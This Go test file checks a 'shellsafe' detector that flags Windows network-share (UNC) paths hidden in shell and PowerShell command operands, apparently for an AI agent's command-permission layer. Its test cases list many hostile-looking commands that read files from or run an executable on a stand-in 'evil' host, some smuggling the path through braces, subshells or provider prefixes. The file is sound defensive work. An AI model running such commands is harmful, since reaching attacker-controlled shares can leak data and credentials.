package shellsafe

import (
	"testing"

	"reasonix/internal/base/fileutil"
)

func holdWindowsPaths(t *testing.T, on bool) {
	t.Helper()
	prev := fileutil.HostIsWindows
	fileutil.HostIsWindows = on
	t.Cleanup(func() { fileutil.HostIsWindows = prev })
}

func TestOperandsNameNetworkPath(t *testing.T) {
	holdWindowsPaths(t, true)
	cases := []struct {
		command string
		network bool
	}{
		{`type \\evil\x`, true},
		{`type "\\evil\x"`, true},
		{`type '\\evil\x'`, true},
		{`cat //evil/x`, true},
		{`cat \\\\evil\\x`, true},
		{`ls //evil/x`, true},
		{`head -n 3 //evil/x/y`, true},
		{`find //evil/x -name a`, true},
		{`grep -r x //evil/x`, true},
		{`grep -r x -- //evil/x`, true},
		{`grep -f//h/s/x pat`, true},
		{`rg -f//h/s/x pat`, true},
		{`grep -f\\h\s\x pat`, true},
		{`Get-Content \\evil\x`, true},
		{`Get-Content "\\evil\x"`, true},
		{`Get-Content -Path:\\evil\x`, true},
		{`Get-Content FileSystem::\\h\s\x`, true},
		{`Get-ChildItem FileSystem::\\h\s`, true},
		{`Get-Content -Path:FileSystem::\\h\s\x`, true},
		{`Get-Content Microsoft.PowerShell.Core\FileSystem::\\h\s\x`, true},
		{`cat /\h\s/x`, true},
		{`cat \/h/s/x`, true},
		{`cat {//h/s/x,y}`, true},
		{`cat {y,//h/s/x}`, true},
		{`cat "$(echo /)/h/s/x"`, true},
		{`cat "/$(echo h)/s"`, true},
		{`cat --file=//evil/x`, true},
		{`cat \\?\UNC\evil\x`, true},
		{`cat //?/UNC/evil/x`, true},
		{`cat //./pipe/x`, true},
		{`git -C //evil/x log`, true},
		{`cd //evil/x`, true},
		{`cat "$(cat //evil/x)"`, true},
		{`cat < //evil/x`, true},
		{`cat a.txt | head //evil/x`, true},
		{`(cat //evil/x)`, true},
		{`ls && cat //evil/x`, true},
		{`\\evil\share\a.exe -v`, true},
		{`Get-Content a.txt,//h/s/x`, true},
		{`Get-Content a.txt,\\h\s\x`, true},
		{`Select-String -Path a,//h/s/x pat`, true},
		{`Get-Content -Path:a,\\h\s\x`, true},
		{`Get-Content "a,//h/s/x"`, true},
		{`Get-Content a.txt,b.txt,//h/s/x`, true},
		{`Get-Content a,FileSystem::\\h\s\x`, true},
		{`grep -E 'a,b' a.go`, false},
		{`echo a,b`, false},
		{`git log --format=%h,%s`, false},
		{`cut -d, -f1 a.csv`, false},
		{`cat a.txt,b.txt`, false},
		{`grep "\bfoo\b" a.go`, false},
		{`rg '\d+' src`, false},
		{`printf '\n'`, false},
		{`find . -name '\*.go'`, false},
		{`grep -E '//' a.go`, false},
		{`grep -rn "// TODO" src`, false},
		{`cat a.txt`, false},
		{`cat ./x/y`, false},
		{`cat C:\x\y`, false},
		{`cat C:/x/y`, false},
		{`cat /etc/hosts`, false},
		{`cat \\?\C:\x`, false},
		{`cat FileSystem::C:\x`, false},
		{`curl https://example.com/a`, false},
		{`grep -r x src | head -n 3`, false},
		{`git log --oneline`, false},
		{`cat "$(git rev-parse --show-toplevel)"`, false},
		{`cat *.go`, false},
		{`ls src/*/x`, false},
		{`Get-Content a.txt`, false},
	}
	for _, tc := range cases {
		if got := OperandsNameNetworkPath(tc.command); got != tc.network {
			t.Errorf("OperandsNameNetworkPath(%q) = %v, want %v", tc.command, got, tc.network)
		}
	}
}

func TestOperandsNameNetworkPathOffWindows(t *testing.T) {
	holdWindowsPaths(t, false)
	for _, command := range []string{`cat //evil/x`, `ls //evil/x`, `type \\evil\x`, `Get-Content FileSystem::\\h\s`} {
		if OperandsNameNetworkPath(command) {
			t.Errorf("%q named a network path off Windows; `//x` is a local path there", command)
		}
	}
}

func TestNetworkPathJudgementDoesNotChangeEffectClassification(t *testing.T) {
	holdWindowsPaths(t, true)
	for _, command := range []string{`cat //evil/x`, `type \\evil\x`, `grep -r x //evil/x`} {
		if _, _, _, ok := ClassifyReadOnlyCommand(command); !ok {
			t.Errorf("ClassifyReadOnlyCommand(%q) changed; the judgement belongs to the permission path only", command)
		}
	}
}
